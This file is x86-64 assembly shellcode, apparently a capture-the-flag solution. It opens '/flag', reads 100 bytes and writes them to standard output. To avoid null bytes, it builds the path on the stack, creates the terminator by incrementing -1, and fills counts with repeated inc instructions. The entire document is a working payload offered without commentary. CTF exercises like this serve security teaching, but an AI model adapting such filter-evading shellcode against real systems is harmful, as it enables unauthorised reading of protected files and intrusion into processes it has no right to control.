.intel_syntax noprefix
.global _start
_start:

// int fd = open("/flag", 0);
xor rax, rax
inc rax
inc rax
// lea rdi, [rip + flag_path]
mov byte ptr [rsp], '/'
mov byte ptr [rsp+1], 'f'
mov byte ptr [rsp+2], 'l'
mov byte ptr [rsp+3], 'a'
mov byte ptr [rsp+4], 'g'
mov byte ptr [rsp+5], -1
inc byte ptr [rsp+5]
push rsp
pop rdi
xor rsi, rsi
syscall

// read(fd, buff, 100);
mov rdi, rax
xor rax, rax 
mov rsi, rsp
xor rdx, rdx
.rept 100
inc rdx
.endr
syscall

// write(1, buff, 100);
xor rax, rax
inc rax
xor rdi, rdi
inc rdi
mov rsi, rsp

xor rdx, rdx
.rept 100
inc rdx
.endr
syscall